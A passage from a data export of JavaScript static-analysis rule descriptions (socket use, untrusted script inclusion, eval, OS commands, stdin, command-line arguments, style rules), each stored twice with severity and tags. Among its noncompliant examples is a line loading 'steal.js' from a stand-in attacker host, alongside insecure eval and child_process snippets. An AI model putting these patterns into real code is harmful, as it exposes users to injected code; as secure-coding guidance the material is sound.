  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
const net = require('net');

var socket = new net.Socket(); // Questionable
socket.connect(80, 'google.com');

// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection
net.createConnection({ port: port }, () =&gt; {}); // Questionable

// net.connect is an alias to net.createConnection
net.connect({ port: port }, () =&gt; {}); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using Sockets is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2015-10-02T13:39:50+0200,"<p>Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this
rule raises an issue for each non-relative URL.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function include(url) {
  var s = document.createElement(""script"");
  s.setAttribute(""type"", ""text/javascript"");
  s.setAttribute(""src"", url);
  document.body.appendChild(s);
}
include(""http://hackers.com/steal.js"")  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/829"">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",javascript:S2611,js,JavaScript,"<p>Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this
rule raises an issue for each non-relative URL.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function include(url) {
  var s = document.createElement(""script"");
  s.setAttribute(""type"", ""text/javascript"");
  s.setAttribute(""src"", url);
  document.body.appendChild(s);
}
include(""http://hackers.com/steal.js"")  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/829"">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",Untrusted content should not be included,"[{'key': 'domainsToIgnore', 'htmlDesc': 'Comma-delimited list of domains to ignore. Regexes may be used, e.g. (.*\\.)?example.com,foo.org', 'type': 'STRING'}]",CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-risky']",VULNERABILITY
2013-06-19T07:34:52+0200,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
</ul>
<p>The <code>eval</code> function is a way to run arbitrary code at run-time. Dynamically evaluating code is slow and a potential security issue when
the arguments haven't been properly validated.</p>
<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so
with code coming from an untrusted source. <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the server or
in the client (exemple: XSS attack).</p>
<p>Note that using the <code>eval</code> function and the <code>Function</code> constructor should in general be avoided altogether.</p>
<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This is for code review only.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let value = eval('obj.' + propName); // Questionable
let func = Function('obj' + propName); // Questionable
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably
safe.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",javascript:Eval,js,JavaScript,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
</ul>
<p>The <code>eval</code> function is a way to run arbitrary code at run-time. Dynamically evaluating code is slow and a potential security issue when
the arguments haven't been properly validated.</p>
<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so
with code coming from an untrusted source. <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the server or
in the client (exemple: XSS attack).</p>
<p>Note that using the <code>eval</code> function and the <code>Function</code> constructor should in general be avoided altogether.</p>
<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This is for code review only.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let value = eval('obj.' + propName); // Questionable
let func = Function('obj' + propName); // Questionable
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably
safe.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Dynamically executing code is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a7']",SECURITY_HOTSPOT
2018-10-25T10:33:52+0200,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  doSomething();
} catch (ex) {  // Noncompliant
  throw ex;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  doSomething();
} catch (ex) {
  console.err(ex);
  throw ex;
}
</pre>
<p>or</p>
<pre>
doSomething();
</pre>",javascript:S2737,js,JavaScript,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  doSomething();
} catch (ex) {  // Noncompliant
  throw ex;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  doSomething();
} catch (ex) {
  console.err(ex);
  throw ex;
}
</pre>
<p>or</p>
<pre>
doSomething();
</pre>","""catch"" clauses should do more than rethrow",[],MINOR,"['clumsy', 'error-handling', 'finding', 'unused']",CODE_SMELL
2019-03-04T09:37:21+0100,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
const cp = require('child_process');

// The following method calls are questionable. Validate the parameter string.
cp.exec(str);
cp.execSync(str);

// The following method calls are questionable if the shell parameter is set to true.
cp.spawn(str, { shell: true });
cp.spawnSync(str, { shell: true });
cp.execFile(str, { shell: true });
cp.execFileSync(str, { shell: true });
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the string being passed is fully hard-coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",javascript:S4721,js,JavaScript,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
const cp = require('child_process');

// The following method calls are questionable. Validate the parameter string.
cp.exec(str);
cp.execSync(str);

// The following method calls are questionable if the shell parameter is set to true.
cp.spawn(str, { shell: true });
cp.spawnSync(str, { shell: true });
cp.execFile(str, { shell: true });
cp.execFileSync(str, { shell: true });
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the string being passed is fully hard-coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Executing OS commands is security-sensitive,[],CRITICAL,"['cwe', 'sans-top25-insecure']",SECURITY_HOTSPOT
2016-01-15T13:56:35+0100,"<p>Use a <code>+</code> with two numbers and you'll get addition. But use it with a string and anything else, and you'll get concatenation. This could
be confusing, especially if it's not obvious that one of the operands is a string. It is recommended to explicitly convert the non-string component to
make it easier to understand to future maintainers.</p>
<p>This rule raises an issue when <code>+</code> is used with a string and a non-string.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  let x = 5 + 8;  // okay
  let z = ""8""
  return x + z;  // Noncompliant; yields string ""138""
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  let x = 5 + 8;
  let z = ""8""
  return x + Number(z);
}
</pre>",javascript:S3402,js,JavaScript,"<p>Use a <code>+</code> with two numbers and you'll get addition. But use it with a string and anything else, and you'll get concatenation. This could
be confusing, especially if it's not obvious that one of the operands is a string. It is recommended to explicitly convert the non-string component to
make it easier to understand to future maintainers.</p>
<p>This rule raises an issue when <code>+</code> is used with a string and a non-string.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  let x = 5 + 8;  // okay
  let z = ""8""
  return x + z;  // Noncompliant; yields string ""138""
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  let x = 5 + 8;
  let z = ""8""
  return x + Number(z);
}
</pre>",Strings and non-strings should not be added,[],MINOR,['confusing'],CODE_SMELL
2016-06-23T14:54:11+0200,"<p>In addition to being obtuse from a syntax perspective, function constructors are also dangerous: their execution evaluates the constructor's string
arguments similar to the way <code>eval</code> works, which could expose your program to random, unintended code which can be both slow and a security
risk.</p>
<p>In general it is better to avoid it altogether, particularly when used to parse JSON data. You should use ECMAScript 5's built-in JSON functions or
a dedicated library.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj =  new Function(""return "" + data)();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj = JSON.parse(data);
</pre>
<h2>Exceptions</h2>
<p>Function calls where the argument is a string literal (e.g. <code>(Function('return this'))()</code>) are ignored. </p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS1523'>S1523</a> instead.</p>",javascript:S3523,js,JavaScript,"<p>In addition to being obtuse from a syntax perspective, function constructors are also dangerous: their execution evaluates the constructor's string
arguments similar to the way <code>eval</code> works, which could expose your program to random, unintended code which can be both slow and a security
risk.</p>
<p>In general it is better to avoid it altogether, particularly when used to parse JSON data. You should use ECMAScript 5's built-in JSON functions or
a dedicated library.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj =  new Function(""return "" + data)();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj = JSON.parse(data);
</pre>
<h2>Exceptions</h2>
<p>Function calls where the argument is a string literal (e.g. <code>(Function('return this'))()</code>) are ignored. </p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:javascript:S1523} instead.</p>",Function constructors should not be used,[],CRITICAL,[],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Most browsers parse and discard a meaningless, trailing comma. Unfortunately, that's not the case for Internet Explorer below version 9, which
throws a meaningless error. Therefore trailing commas should be eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var settings = {
    'foo'  : oof,
    'bar' : rab,    // Noncompliant - trailing comma
};
</pre>
<h2>Compliant Solution</h2>
<pre>
var settings = {
    'foo'  : oof,
    'bar' : rab
};
</pre>",javascript:TrailingComma,js,JavaScript,"<p>Most browsers parse and discard a meaningless, trailing comma. Unfortunately, that's not the case for Internet Explorer below version 9, which
throws a meaningless error. Therefore trailing commas should be eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var settings = {
    'foo'  : oof,
    'bar' : rab,    // Noncompliant - trailing comma
};
</pre>
<h2>Compliant Solution</h2>
<pre>
var settings = {
    'foo'  : oof,
    'bar' : rab
};
</pre>",Trailing commas should not be used,[],MINOR,['cross-browser'],CODE_SMELL
2019-03-04T09:37:20+0100,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
// All uses of process.stdin are security-sensitive and should be reviewed

process.stdin.on('readable', () =&gt; {
	const chunk = process.stdin.read(); // Questionable
	if (chunk !== null) {
		dosomething(chunk);
	}
});

const readline = require('readline');
readline.createInterface({
	input: process.stdin // Questionable
}).on('line', (input) =&gt; {
	dosomething(input);
});
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",javascript:S4829,js,JavaScript,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
// All uses of process.stdin are security-sensitive and should be reviewed

process.stdin.on('readable', () =&gt; {
	const chunk = process.stdin.read(); // Questionable
	if (chunk !== null) {
		dosomething(chunk);
	}
});

const readline = require('readline');
readline.createInterface({
	input: process.stdin // Questionable
}).on('line', (input) =&gt; {
	dosomething(input);
});
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",Reading the Standard Input is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2013-06-19T07:34:52+0200,"<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>",javascript:SwitchWithoutDefault,js,JavaScript,"<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>","""switch"" statements should have ""default"" clauses",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2019-03-04T09:37:20+0100,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
var param = process.argv[2]; // Questionable: check how the argument is used
console.log('Param: ' + param);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",javascript:S4823,js,JavaScript,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
var param = process.argv[2]; // Questionable: check how the argument is used
console.log('Param: ' + param);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
